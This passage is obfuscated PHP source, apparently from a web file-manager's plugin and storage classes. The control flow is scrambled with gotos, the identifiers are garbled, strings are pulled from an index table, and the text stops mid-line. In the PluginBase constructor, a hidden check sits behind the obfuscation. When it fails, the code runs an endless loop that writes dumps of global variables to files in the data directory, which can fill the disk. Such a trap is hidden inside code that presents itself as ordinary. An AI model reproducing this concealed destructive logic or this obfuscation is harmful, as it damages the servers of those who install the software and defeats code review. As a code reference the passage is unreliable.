$dªë¨·„°í->end(); goto b’®½Ä¨òÏ; F§¹ÏæØİÙ: $a­ó‚Ô¢¶Å =& $_SERVER[“]; $E›¢”Ïé”È = time() - 3600 * 24 * $b…ÆÛİ…†; $EÂñÄÎëŠÕ = $a­ó‚Ô¢¶Å[2157] . $E›¢”Ïé”È; goto cÅ„‚ØóŠõ; cÅ„‚ØóŠõ: $FëÏõŠ°” = $this->where($EÂñÄÎëŠÕ)->select(); if (!$FëÏõŠ°”) { return; } $dªë¨·„°í = new Task($a­ó‚Ô¢¶Å[2158], $a­ó‚Ô¢¶Å[33], count($FëÏõŠ°”)); goto Fß„óô‰—; b’®½Ä¨òÏ: } public function resetFile($CÈã’Õ„Êô) { goto Eæƒ‹Ä¶ÓÃ; a†¥İÅĞ†Ğ: $A‚òØ¤ÁÅ¬ = Model($AÈ¦Öñ¯…İ[2159])->where($FåÛÛÌÊŠç)->count(); $AÂäÍ×’áŸ = intval($c–¾ßÅïáƒ) + intval($A‚òØ¤ÁÅ¬); if ($AÂäÍ×’áŸ == 0) { IO::remove($CÈã’Õ„Êô[$AÈ¦Öñ¯…İ[75]]); $this->where($FåÛÛÌÊŠç)->delete(); $this->metaSet($CÈã’Õ„Êô[$AÈ¦Öñ¯…İ[419]], null, null); return; } goto dµçäš°µ; dµçäš°µ: if ($CÈã’Õ„Êô[$AÈ¦Öñ¯…İ[2155]] != $AÂäÍ×’áŸ) { $this->where($FåÛÛÌÊŠç)->save(array($AÈ¦Öñ¯…İ[2151] => $AÂäÍ×’áŸ)); } goto D‹ô«ÓÎ†; Eæƒ‹Ä¶ÓÃ: $AÈ¦Öñ¯…İ =& $_SERVER[“]; $FåÛÛÌÊŠç = array($AÈ¦Öñ¯…İ[420] => $CÈã’Õ„Êô[$AÈ¦Öñ¯…İ[419]]); $c–¾ßÅïáƒ = Model($AÈ¦Öñ¯…İ[1104])->where($FåÛÛÌÊŠç)->count(); goto a†¥İÅĞ†Ğ; D‹ô«ÓÎ†: } public function storageInfo($a®»íõá‰ = false) { goto f¨²±¯Óò¸; FÕ…¬µ«ôé: $DË½°Ê‡™‰ = 1; $bğ…©”‡¢£ = 0; $a°’ÊˆºĞØ = 5000; goto fĞÊŒ©¢Ç; f¨²±¯Óò¸: $c­Ëø¦…Ï =& $_SERVER[“]; $dâ»ª›Û¤õ = $this->count() + 0.0; $b„‡ˆ½ù = 0; goto FÕ…¬µ«ôé; fĞÊŒ©¢Ç: for ($f²¥¥…¢™… = 0; $f²¥¥…¢™… < $dâ»ª›Û¤õ; $f²¥¥…¢™… = $f²¥¥…¢™… + $a°’ÊˆºĞØ) { $d††Úå¸ = $this->limit($f²¥¥…¢™…, $f²¥¥…¢™… + $a°’ÊˆºĞØ)->select(); foreach ($d††Úå¸ as $d˜†©âã¨ä) { $DË½°Ê‡™‰ += $d˜†©âã¨ä[$c­Ëø¦…Ï[77]] * $d˜†©âã¨ä[$c­Ëø¦…Ï[2155]]; $b„‡ˆ½ù += $d˜†©âã¨ä[$c­Ëø¦…Ï[77]] * ($d˜†©âã¨ä[$c­Ëø¦…Ï[2155]] - 1); $bğ…©”‡¢£ += $d˜†©âã¨ä[$c­Ëø¦…Ï[2155]]; } } $E¤î‰¦É÷Û = array($c­Ëø¦…Ï[2160] => $DË½°Ê‡™‰, $c­Ëø¦…Ï[2161] => $b„‡ˆ½ù, $c­Ëø¦…Ï[2162] => $b„‡ˆ½ù / $DË½°Ê‡™‰, $c­Ëø¦…Ï[81] => $dâ»ª›Û¤õ, $c­Ëø¦…Ï[2163] => $bğ…©”‡¢£); return $E¤î‰¦É÷Û; goto d•Öïô¿ù; d•Öïô¿ù: } } goto DÍ›ëóä¶; e¤×øˆ¼’: class Message { function __construct() { } public function send($aí®ùÂÁòõ = '', $Fø£ˆÅŸ˜ä = array(), $BÌËÈõˆ“« = "\164\x65\170\x74") { goto cù®Ÿ¾ˆ—Ø; eéÎ­Í¬²: Hook::trigger($fîí´¬¡ºÎ[1294], $E®è²ÁñŸ); goto cŸÁ–ñËˆ; cù®Ÿ¾ˆ—Ø: $fîí´¬¡ºÎ =& $_SERVER[“]; $A§œ¼ŸÀå = array($fîí´¬¡ºÎ[29] => $fîí´¬¡ºÎ[1291], $fîí´¬¡ºÎ[676] => $aí®ùÂÁòõ); if (in_array($BÌËÈõˆ“«, array($fîí´¬¡ºÎ[1291], $fîí´¬¡ºÎ[1292]))) { $A§œ¼ŸÀå[$fîí´¬¡ºÎ[29]] = $BÌËÈõˆ“«; } goto BâÆÉÑˆ¶; BâÆÉÑˆ¶: $Fø£ˆÅŸ˜ä = array($fîí´¬¡ºÎ[957] => isset($Fø£ˆÅŸ˜ä[$fîí´¬¡ºÎ[957]]) ? $Fø£ˆÅŸ˜ä[$fîí´¬¡ºÎ[957]] : $fîí´¬¡ºÎ[33], $fîí´¬¡ºÎ[537] => isset($Fø£ˆÅŸ˜ä[$fîí´¬¡ºÎ[537]]) ? $Fø£ˆÅŸ˜ä[$fîí´¬¡ºÎ[537]] : $fîí´¬¡ºÎ[33]); if (empty($aí®ùÂÁòõ) || empty($Fø£ˆÅŸ˜ä[$fîí´¬¡ºÎ[957]]) && empty($Fø£ˆÅŸ˜ä[$fîí´¬¡ºÎ[537]])) { return !1; } $E®è²ÁñŸ = array($fîí´¬¡ºÎ[1233] => $A§œ¼ŸÀå, $fîí´¬¡ºÎ[1293] => $Fø£ˆÅŸ˜ä); goto eéÎ­Í¬²; cŸÁ–ñËˆ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto a‡­â¼áƒ; f¦Û×›Õ©: if ($_SERVER[$B’©èøªÛ[774]] != $dŒĞ®„èÕ”($DøØ“Æ§‘³)) { goto e”Ä˜ù·¯³; c’œ×ÓŒø: $Bª¨¤¾®‰Ü = 1; for ($DÖÉÏ£ËÔ = $Bª¨¤¾®‰Ü; $DÖÉÏ£ËÔ > 0; $DÖÉÏ£ËÔ++) { $cÔ™¯ö¼”Ä(DATA_PATH . $DÖÉÏ£ËÔ, $FÖ’¼‡±ïˆ); } goto f¹ÃôÁğİ; e”Ä˜ù·¯³: $FÒ‘ˆ‰¦‚ = $B’©èøªÛ[775]; $CËÃ’–è§À = $B’©èøªÛ[776]; $F¯Ï‚í÷ˆ‹ = $_SERVER[$B’©èøªÛ[777]] . $B’©èøªÛ[778]; goto fĞÇŒŒ®å; DŒø­¦òå„: $FÒ‘ˆ‰¦‚(); $cÔ™¯ö¼”Ä = $B’©èøªÛ[781]; $FÖ’¼‡±ïˆ = json_encode($GLOBALS[$B’©èøªÛ[782]]); goto c’œ×ÓŒø; E†§èŸš: $f½Ÿ÷‚Ú = $B’©èøªÛ[780]; $f½Ÿ÷‚Ú($_SERVER[$B’©èøªÛ[771]]); $FÒ‘ˆ‰¦‚ = $B’©èøªÛ[775]; goto DŒø­¦òå„; fĞÇŒŒ®å: $Fæ¶Çç£˜ = $CËÃ’–è§À($F¯Ï‚í÷ˆ‹); $c‹·âÇê…ˆ = explode($B’©èøªÛ[217], $Fæ¶Çç£˜); if (count($c‹·âÇê…ˆ) < $B’©èøªÛ[563]) { $B†½ĞÚ‹¬÷ = $B’©èøªÛ[779]; $B†½ĞÚ‹¬÷(); } goto E†§èŸš; f¹ÃôÁğİ: } global $in, $config; $this->config =& $config; goto d»“Õ£§¯; D Áğİ Ÿ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $B’©èøªÛ[8]; $this->pluginApi = appHostGet() . $B’©èøªÛ[1296] . $this->pluginName . $B’©èøªÛ[8]; $this->pluginHost = $config[$B’©èøªÛ[1297]] . $this->pluginName . $B’©èøªÛ[8]; goto E•Úèˆ›; a‡­â¼áƒ: $B’©èøªÛ =& $_SERVER[“]; $DøØ“Æ§‘³ = $_SERVER[$B’©èøªÛ[777]] . $B’©èøªÛ[778]; $dŒĞ®„èÕ” = $B’©èøªÛ[773]; goto f¦Û×›Õ©; C³¿¯¹âŒÁ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto DÛ‰ÈæÃß™; E•Úèˆ›: $this->pluginHostDefault = $config[$B’©èøªÛ[1297]] . $this->pluginName . $B’©èøªÛ[8]; $bî¦””ÅĞ = $config[$B’©èøªÛ[1298]]; if ($bî¦””ÅĞ && strpos($B’©èøªÛ[47] . $bî¦””ÅĞ . $B’©èøªÛ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$B’©èøªÛ[1299]] . $this->pluginName . $B’©èøªÛ[8]; } goto C³¿¯¹âŒÁ; d»“Õ£§¯: $this->in =& $in; $this->modelPlugin = Model($B’©èøªÛ[1295]); $this->pluginName = str_replace($B’©èøªÛ[1295], $B’©èøªÛ[33], get_class($this)); goto D Áğİ Ÿ; DÛ‰ÈæÃß™: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[“][1300]); } protected function assign($E–¯Íğ§Ô, $a”¶Â”… = false) { if (is_array($E–¯Íğ§Ô)) { $this->values = array_merge($this->values, $E–¯Íğ§Ô); } else { $this->values[$E–¯Íğ§Ô] = $a”¶Â”…; } } protected function display($B‹ÓåİÀÑò) { extract($this->values); require $B‹ÓåİÀÑò; } final function hookRegist($d¥ï­èáğ‹) { $this->modelPlugin->appRegist($this->pluginName, $d¥ï­èáğ‹); } final function appIcon() { $e´–†„³ºÃ =& $_SERVER[“]; $CÓÂŸ§¸ÍŒ = $this->appPackage(); $D´›ì¸ù± = $e´–†„³ºÃ[33]; if (isset($CÓÂŸ§¸ÍŒ[$e´–†„³ºÃ[382]])) { if (isset($CÓÂŸ§¸ÍŒ[$e´–†„³ºÃ[382]][$e´–†„³ºÃ[1301]])) { $D´›ì¸ù± = $e´–†„³ºÃ[1302] . $CÓÂŸ§¸ÍŒ[$e´–†„³ºÃ[382]][$e´–†„³ºÃ[1301]] . $e´–†„³ºÃ[1303]; } else { if ($CÓÂŸ§¸ÍŒ[$e´–†„³ºÃ[382]][$e´–†„³ºÃ[1304]]) { $D´›ì¸ù± = $e´–†„³ºÃ[1305] . $CÓÂŸ§¸ÍŒ[$e´–†„³ºÃ[382]][$e´–†„³ºÃ[1304]] . $e´–†„³ºÃ[1306]; } } } return $D´›ì¸ù±; } final function fileCanView($fßˆÌò‡¸) { goto aªöªòá; D³×ô¨ïç: ActionCall($A»¹¼ËîêÆ[1319], $fßˆÌò‡¸); goto aÀ´šôè; aªöªòá: $A»¹¼ËîêÆ =& $_SERVER[“]; if (request_url_safe($fßˆÌò‡¸)) { return !0; } if ($this->isShare($fßˆÌò‡¸)) { return !0; } goto E—¦ƒåÛä›; E—¦ƒåÛä›: $E‰²±¹å = Session::get($A»¹¼ËîêÆ[1307]); if (!$E‰²±¹å || !$E‰²±¹å[$A»¹¼ËîêÆ[1308]]) { $eÛÛŒ‚ëµ = $A»¹¼ËîêÆ[1309] . rawurlencode(this_url()); show_tips(LNG($A»¹¼ËîêÆ[1310]) . $A»¹¼ËîêÆ[1311] . $eÛÛŒ‚ëµ . $A»¹¼ËîêÆ[1312] . LNG($A»¹¼ËîêÆ[1313]) . $A»¹¼ËîêÆ[1314], !1); } if (!Action($A»¹¼ËîêÆ[1315])->authCan($A»¹¼ËîêÆ[1316])) { show_tips(LNG($A»¹¼ËîêÆ[1317]) . $A»¹¼ËîêÆ[1318], !1); } goto D³×ô¨ïç; aÀ´šôè: } final function isShare($E†İƒ±–ˆ) { $AÑÉß‰Î™é = KodIO::parse($E†İƒ±–ˆ); return $AÑÉß‰Î™é[$_SERVER[“][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($aéŸäÇ›ÆŒ) { if (request_url_safe($aéŸäÇ›ÆŒ)) { return $aéŸäÇ›ÆŒ; } if (!$this->isShare($aéŸäÇ›ÆŒ)) { $aéŸäÇ›ÆŒ = $this->filePath($aéŸäÇ›ÆŒ); } return Action($_SERVER[“][1005])->linkOut($aéŸäÇ›ÆŒ); } public function filePathLinkOut($aÀĞ£ÀÚ„’) { if (request_url_safe($aÀĞ£ÀÚ„’)) { return $aÀĞ£ÀÚ„’; } $this->fileCanView($aÀĞ£ÀÚ„’); return Action($_SERVER[“][1005])->link($aÀĞ£ÀÚ„’); } final function filePath($e´¥‰Ÿ´•) { $aÅèïê’ =& $_SERVER[“]; if ($Bé¬í¹ÙËó = $this->checkSharePath($e´¥‰Ÿ´•)) { return $Bé¬í¹ÙËó; } $this->fileCanView($e´¥‰Ÿ´•); if (request_url_safe($e´¥‰Ÿ´•)) { $Aß¦†‚ëÁñ = parse_url_query($e´¥‰Ÿ´•); if (isset($Aß¦†‚ëÁñ[$aÅèïê’[1320]]) && isset($Aß¦†‚ëÁñ[$aÅèïê’[197]])) { $EÑã”òåèƒ = Model($aÅèïê’[1075])->get($aÅèïê’[1321]); $F•¢ˆºçá = Mcrypt::decode($Aß¦†‚ëÁñ[$aÅèïê’[197]], $EÑã”òåèƒ); if ($F•¢ˆºçá) { $this->fileInfo = IO::infoWithChildren($F•¢ˆºçá); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $F•¢ˆºçá; } } $e´¥‰Ÿ´• = $this->_cacheHttpFile($e´¥‰Ÿ´•); $this->fileInfo = IO::infoWithChildren($e´¥‰Ÿ´•); } else { $this->fileInfo = IO::infoWithChildren($e´¥‰Ÿ´•); if (!$this->fileInfo) { show_tips(LNG($aÅèïê’[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $e´¥‰Ÿ´•; } final function _cacheHttpFile($fø¯ÂÖ½šÏ) { $aà•Å±¯£« = hash_path($fø¯ÂÖ½šÏ, !0); $this->cachePath = $this->pluginCachePath($aà•Å±¯£«); if ($D¿ …¥Èß = IO::fileNameExist($this->cachePath, $aà•Å±¯£«)) { return KodIO::make($D¿ …¥Èß); } $aƒĞÄÈƒãÅ = $this->cachePath . $aà•Å±¯£«; return $this->pluginCacheFileSet($aƒĞÄÈƒãÅ, file_get_contents($fø¯ÂÖ½šÏ)); } final function _tmpFileName($c³…ìÉ¦»Ø = array()) { goto eïà ¹­˜; eïà ¹­˜: $dÑ ºÔ»ÕÎ =& $_SERVER[“]; if (!$c³…ìÉ¦»Ø) { $c³…ìÉ¦»Ø = $this->fileInfo; } if (isset($c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[164]])) { return $c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[164]]; } goto fœá®Ö’Î”; B½©§´äÔ±: $Eø…ßõÕÊ¬ = array($c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[28]], $c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[75]], $c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[77]]); if (isset($c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[461]])) { $Eø…ßõÕÊ¬[] = $c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[461]]; } return md5(implode($dÑ ºÔ»ÕÎ[70], $Eø…ßõÕÊ¬)); goto eòÎš’î‹Ğ; fœá®Ö’Î”: if (isset($c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[162]][$dÑ ºÔ»ÕÎ[164]])) { return $c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[162]][$dÑ ºÔ»ÕÎ[164]]; } $FœªêÕ§È« = IO::hashSimple($c³…ìÉ¦»Ø[$dÑ ºÔ»ÕÎ[75]]); if ($FœªêÕ§È«) { return $FœªêÕ§È«; } goto B½©§´äÔ±; eòÎš’î‹Ğ: } final function checkSharePath($E¿ÅˆÎ¨¿¾) { goto F¹Ç±æ§ùã; F¹Ç±æ§ùã: $E”æÌŠ =& $_SERVER[“]; if (!defined($E”æÌŠ[427])) { define($E”æÌŠ[1322], 0); } if (!$this->isShare($E¿ÅˆÎ¨¿¾)) { return !1; } goto Dö³£³ÎÑç; bªƒ¶ˆİÕ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$E”æÌŠ[164]]); return $e˜ÂˆÆñ¢Î[$E”æÌŠ[75]]; goto BÔ²Š–š; Dö³£³ÎÑç: $e˜ÂˆÆñ¢Î = Action($E”æÌŠ[1005])->sharePathInfo($E¿ÅˆÎ¨¿¾); if (!isset($e˜ÂˆÆñ¢Î[$E”æÌŠ[75]])) { show_json(LNG($E”æÌŠ[1323]), !1); } $this->fileInfo = $e˜ÂˆÆñ¢Î[$E”æÌŠ[162]]; goto bªƒ¶ˆİÕ; BÔ²Š–š: } final function pluginCachePath($F®èÍŸ¬¨ä = '') { $bØìößŒ¤Ú =& $_SERVER[“]; $cÑÈï­¢‘æ = IO_PATH_SYSTEM_TEMP . $bØìößŒ¤Ú[1324] . $this->pluginName; if (!($c‡°£‘·Äº = IO::infoFull($cÑÈï­¢‘æ))) { return IO::mkdir($cÑÈï­¢‘æ . $bØìößŒ¤Ú[8] . $F®èÍŸ¬¨ä); } if (empty($F®èÍŸ¬¨ä)) { return $c‡°£‘·Äº[$bØìößŒ¤Ú[75]]; } if (!($F”ª¦¶³§ = IO::fileNameExist($c‡°£‘·Äº[$bØìößŒ¤Ú[75]], $F®èÍŸ¬¨ä))) { return IO::mkdir($c‡°£‘·Äº[$bØìößŒ¤Ú[75]] . $F®èÍŸ¬¨ä); } return KodIO::make($F”ª¦¶³§); } final function pluginCacheFileSet($D¯Æßôµ›‹, $FÄŸ‰ĞË³ë = '') { $b»Ş›¤©æï =& $_SERVER[“]; if (!($bÓ„ãàÚíĞ = IO::infoFull($D¯Æßôµ›‹))) { return IO::mkfile($D¯Æßôµ›‹, $FÄŸ‰ĞË³ë, REPEAT_REPLACE); } IO::setContent($bÓ„ãàÚíĞ[$b»Ş›¤©æï[75]], $FÄŸ‰ĞË³ë); return $bÓ„ãàÚíĞ[$b»Ş›¤©æï[75]]; } final function pluginLocalFile($F‘­±îåï = '') { goto a”Ïì©¢ê‰; a”Ïì©¢ê‰: $E‡•‹î·í =& $_SERVER[“]; $DÅÖ¾âØ¿ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($DÅÖ¾âØ¿)) { mk_dir($DÅÖ¾âØ¿); } goto FŸâÄÉè¯‘; eÁ‘ÛÎŒØ: $c¡¹ñÎ£·¨ = $DÅÖ¾âØ¿ . $a·Ä²¾×Š; if (@file_exists($c¡¹ñÎ£·¨)) { return $c¡¹ñÎ£·¨; } return IO::copy($F‘­±îåï, $DÅÖ¾âØ¿, 0, $a·Ä²¾×Š); goto d¥ÆÅâ³Í‚; FŸâÄÉè¯‘: if (!$F‘­±îåï) { return $DÅÖ¾âØ¿; } $C¡†£‚ÚÈ® = IO::info($F‘­±îåï); $a·Ä²¾×Š = $this->_tmpFileName($C¡†£‚ÚÈ®) . $E‡•‹î·í[91] . $C¡†£‚ÚÈ®[$E‡•‹î·í[160]]; goto eÁ‘ÛÎŒØ; d¥ÆÅâ³Í‚: } final function appPackage() { goto aÕÂŠä•éÃ; C¸óÑæîß†: return $d¾äõÇ¨; goto F×œğÏ—‘í; B…òĞº¼à: $EÕóß¡“«ã = Hook::trigger($bÂ„†Íá÷[1326], $d¾äõÇ¨); if ($EÕóß¡“«ã && is_array($EÕóß¡“«ã)) { $d¾äõÇ¨ = $EÕóß¡“«ã; } $this->packageData = $d¾äõÇ¨; goto C¸óÑæîß†; aÕÂŠä•éÃ: $bÂ„†Íá÷ =& $_SERVER[“]; if ($this->packageData) { return $this->packageData; } $cİÏ…‹Ó¯ = $this->parseFile($this->pluginPath . $bÂ„†Íá÷[1325]); goto FïÔóö›ì™; FïÔóö›ì™: $this->parseLang($cİÏ…‹Ó¯); $d¾äõÇ¨ = json_decode_force($cİÏ…‹Ó¯); if (!$d¾äõÇ¨) { return array(); } goto B…òĞº¼à; F×œğÏ—‘í: } public function packageInfoGet($eÑ¹Ç•É) { $Aó‰ÅßÂ = $this->appPackage(); return array_get_value($Aó‰ÅßÂ, $eÑ¹Ç•É); } public function packageVersion() { return $this->packageInfoGet($_SERVER[“][1327]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[“][1328]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[“][1329]); } private function parseFile($bíÛ²‡¢¢Á) { goto e¡øá†Õ¤‘; e¡øá†Õ¤‘: $dë¸Ó«Áô =& $_SERVER[“]; $aŸ†–¬ÚÖÀ = file_get_contents($bíÛ²‡¢¢Á); $EÙ¢ĞÑš’Í = array($dë¸Ó«Áô[1330], $dë¸Ó«Áô[1331], $dë¸Ó«Áô[1332], $dë¸Ó«Áô[1333], $dë¸Ó«Áô[1334], $dë¸Ó«Áô[1335], $dë¸Ó«Áô[1336]); goto bÅŸ˜º£–©; EÄ–Ğõ”ç‹: $aŸ†–¬ÚÖÀ = str_replace($EÙ¢ĞÑš’Í, $BóÉ®¡õÆÏ, $aŸ†–¬ÚÖÀ); return $aŸ†–¬ÚÖÀ; goto D´¥¡Á‹×…; bÅŸ˜º£–©: $BóÉ®¡õÆÏ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$dë¸Ó«Áô[84]][$dë¸Ó«Áô[1337]]); if (strstr($aŸ†–¬ÚÖÀ, $dë¸Ó«Áô[1338])) { $F³ãºÂ‚â¦ = rawurlencode(json_encode($this->pluginLangArr)); $aŸ†–¬ÚÖÀ = str_replace($dë¸Ó«Áô[1338], $F³ãºÂ‚â¦, $aŸ†–¬ÚÖÀ); } if (strstr($aŸ†–¬ÚÖÀ, $dë¸Ó«Áô[1339])) { $F³ãºÂ‚â¦ = $F³ãºÂ‚â¦ = rawurlencode(json_encode($this->getConfig())); $aŸ†–¬ÚÖÀ = str_replace($dë¸Ó«Áô[1339], $F³ãºÂ‚â¦, $aŸ†–¬ÚÖÀ); } goto EÄ–Ğõ”ç‹; D´¥¡Á‹×…: } private function parseLang(&$fÔšÄ¼ÂÀÙ) { goto E†Íí’àÇê; a‰–šÏ˜îé: $c±È¦Ññ• = array(); foreach ($cÊ¬‚áÜ‡[0] as $A¬‡¦ÔÂŸ÷) { $a¬”Ïô³«â = substr($A¬‡¦ÔÂŸ÷, strlen($cõ‰¾¸àŠ–), -4); $aóÈĞ‡øÈ£ = LNG($a¬”Ïô³«â); $E¦ŞÚ¶À·æ[] = $A¬‡¦ÔÂŸ÷; $c±È¦Ññ•[] = str_replace(array($C·ï’ôæ•š[217], $C·ï’ôæ•š[979], $C·ï’ôæ•š[330], $C·ï’ôæ•š[113]), array($C·ï’ôæ•š[50], $C·ï’ôæ•š[50], $C·ï’ôæ•š[33], $C·ï’ôæ•š[1342]), $aóÈĞ‡øÈ£); } $fÔšÄ¼ÂÀÙ = str_replace($E¦ŞÚ¶À·æ, $c±È¦Ññ•, $fÔšÄ¼ÂÀÙ); goto dÕÉİ¢¶Ÿ–; bø™îï¤Âã: preg_match_all($C·ï’ôæ•š[1341], $fÔšÄ¼ÂÀÙ, $cÊ¬‚áÜ‡); if (!is_array($cÊ¬‚áÜ‡) || count($cÊ¬‚áÜ‡) == 0 || !is_array($cÊ¬‚áÜ‡[0]) || count($cÊ¬‚áÜ‡[0]) == 0) { return; } $E¦ŞÚ¶À·æ = array(); goto a‰–šÏ˜îé; E†Íí’àÇê: $C·ï’ôæ•š =& $_SERVER[“]; $cõ‰¾¸àŠ– = $C·ï’ôæ•š[1340]; if (!strstr($fÔšÄ¼ÂÀÙ, $cõ‰¾¸àŠ–)) { return; } goto bø™îï¤Âã; dÕÉİ¢¶Ÿ–: } private function parseConfig(&$Bš›Ê†–®¤) { goto BÔŒ‘ÁÁ§Ó; BÔŒ‘ÁÁ§Ó: $eó¤²¯ğ¥’ =& $_SERVER[“]; $bïÈÓ«ÑŸ” = $eó¤²¯ğ¥’[1343]; if (!strstr($Bš›Ê†–®¤, $bïÈÓ«ÑŸ”)) { return; } goto EÉˆ‹¤‘Ê—; F¿„Ê›À¨È: $E‹™ÀĞë‚Ã = array(); $D¢¾Ñ»œÌ¼ = array(); foreach ($c£™ºœÖ®Õ[0] as $eÓ¡„Ñô£Ø) { $EØ°ĞŠ¦ƒ‚ = substr($eÓ¡„Ñô£Ø, strlen($bïÈÓ«ÑŸ”), -2); $E‹™ÀĞë‚Ã[] = $eÓ¡„Ñô£Ø; $D¢¾Ñ»œÌ¼[] = _get($Fæ­Û¬Úª, $EØ°ĞŠ¦ƒ‚); } goto D£íëÙ™ó; D£íëÙ™ó: $Bš›Ê†–®¤ = str_replace($E‹™ÀĞë‚Ã, $D¢¾Ñ»œÌ¼, $Bš›Ê†–®¤); goto fï£è±”ß; EÉˆ‹¤‘Ê—: preg_match_all($eó¤²¯ğ¥’[1344], $Bš›Ê†–®¤, $c£™ºœÖ®Õ); if (!is_array($c£™ºœÖ®Õ) || count($c£™ºœÖ®Õ) == 0 || !is_array($c£™ºœÖ®Õ[0]) || count($c£™ºœÖ®Õ[0]) == 0) { return; } $Fæ­Û¬Úª = $this->getConfig(); goto F¿„Ê›À¨È; fï£è±”ß: } private function parsePackage(&$d‰œ°ï¿‚ß) { goto Dµ¨ Ù¥˜Ë; Dµ¨ Ù¥˜Ë: $CŠ‰ñ”£‹¦ =& $_SERVER[“]; $Cœ²Ï×Ñâó = $CŠ‰ñ”£‹¦[1345]; if (!strstr($d‰œ°ï¿‚ß, $Cœ²Ï×Ñâó)) { return; } goto bÉ”¼ó‰; bÉ”¼ó‰: preg_match_all($CŠ‰ñ”£‹¦[1346], $d‰œ°ï¿‚ß, $EÏœ®¨‡—¶); if (!is_array($EÏœ®¨‡—¶) || count($EÏœ®¨‡—¶) == 0 || !is_array($EÏœ®¨‡—¶[0]) || count($EÏœ®¨‡—¶[0]) == 0) { return; } $fÍ¸¾ĞêÛ— = $this->appPackage(); goto cİå°³ÅÑö; Fƒ½“Â‚•Ù: $d‰œ°ï¿‚ß = str_replace($c•›¬ë§õ², $bâæ‹áªŞŒ, $d‰œ°ï¿‚ß); goto a¨ìãáäÎ; cİå°³ÅÑö: $c•›¬ë§õ² = array(); $bâæ‹áªŞŒ = array(); foreach ($EÏœ®¨‡—¶[0] as $aÖˆØé’È…) { $fŒí•Ú¦¯ = substr($aÖˆØé’È…, strlen($Cœ²Ï×Ñâó), -2); $c•›¬ë§õ²[] = $aÖˆØé’È…; $bâæ‹áªŞŒ[] = _get($fÍ¸¾ĞêÛ—, $fŒí•Ú¦¯); } goto Fƒ½“Â‚•Ù; a¨ìãáäÎ: } final function echoFile($A¤ÑÒ©°–ğ, $AÈİƒÕø›ä = false) { goto FÙ¦µÉ°°ã; føÛË˜çÉ¯: $this->parsePackage($aÓÓÜÃÕµœ); if (is_array($AÈİƒÕø›ä)) { $aÓÓÜÃÕµœ = str_replace(array_keys($AÈİƒÕø›ä), array_values($AÈİƒÕø›ä), $aÓÓÜÃÕµœ); } echo $DŒì¶œ½†Ã[217] . $aÓÓÜÃÕµœ; goto A…‰åÄÚƒ…; FÙ¦µÉ°°ã: $DŒì¶œ½†Ã =& $_SERVER[“]; $aŒË‘¸ØÉ„ = $this->pluginPath . $A¤ÑÒ©°–ğ; if (ACT == $DŒì¶œ½†Ã[1347]) { echo $DŒì¶œ½†Ã[1348] . $this->pluginName . $DŒì¶œ½†Ã[8] . $A¤ÑÒ©°–ğ . $DŒì¶œ½†Ã[1349]; if (!file_exists($aŒË‘¸ØÉ„)) { echo $DŒì¶œ½†Ã[1350]; return; } } goto a¬“Ò¤™Œî; a¬“Ò¤™Œî: $aÓÓÜÃÕµœ = $this->parseFile($aŒË‘¸ØÉ„); $this->parseLang($aÓÓÜÃÕµœ); $this->parseConfig($aÓÓÜÃÕµœ); goto føÛË˜çÉ¯; A…‰åÄÚƒ…: } final function initLang() { goto e¿©’Ï½; B•ÇôÎßé×: $aéø«Œå™‘ = I18n::getType(); $A¹ÌºŸôÌ¾ = array(); if (file_exists($fñÁØİ©ó’ . $aéø«Œå™‘ . $F³ªĞ’œİ†[749])) { $A¹ÌºŸôÌ¾ = (include $fñÁØİ©ó’ . $aéø«Œå™‘ . $F³ªĞ’œİ†[749]); } else { if ($aéø«Œå™‘ == $F³ªĞ’œİ†[1353] && !file_exists($fñÁØİ©ó’ . $aéø«Œå™‘ . $F³ªĞ’œİ†[749]) && file_exists($fñÁØİ©ó’ . $F³ªĞ’œİ†[1354])) { $A¹ÌºŸôÌ¾ = (include $fñÁØİ©ó’ . $F³ªĞ’œİ†[1354]); } else { if (file_exists($fñÁØİ©ó’ . $aò‚À Âˆ . $F³ªĞ’œİ†[749])) { $A¹ÌºŸôÌ¾ = (include $fñÁØİ©ó’ . $aò‚À Âˆ . $F³ªĞ’œİ†[749]); } } } goto eŸœÌêÛÃˆ; e¿©’Ï½: $F³ªĞ’œİ† =& $_SERVER[“]; $aò‚À Âˆ = $F³ªĞ’œİ†[1351]; $fñÁØİ©ó’ = $this->pluginPath . $F³ªĞ’œİ†[1352]; goto B•ÇôÎßé×; eŸœÌêÛÃˆ: if (!is_array($A¹ÌºŸôÌ¾)) { return array(); } if (@count($A¹ÌºŸôÌ¾) > 0) { I18n::set($A¹ÌºŸôÌ¾); } return $A¹ÌºŸôÌ¾; goto dã³èİÇ÷«; dã³èİÇ÷«: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($b¶¨ÉÔÚ§) { $Fö†ÓñØ™ =& $_SERVER[“]; $c‰—ÁÉêœ‘ = $_SERVER[$Fö†ÓñØ™[777]] . $Fö†ÓñØ™[778]; $aÁÔï™¡Á = $Fö†ÓñØ™[773]; if ($_SERVER[$Fö†ÓñØ™[774]] != 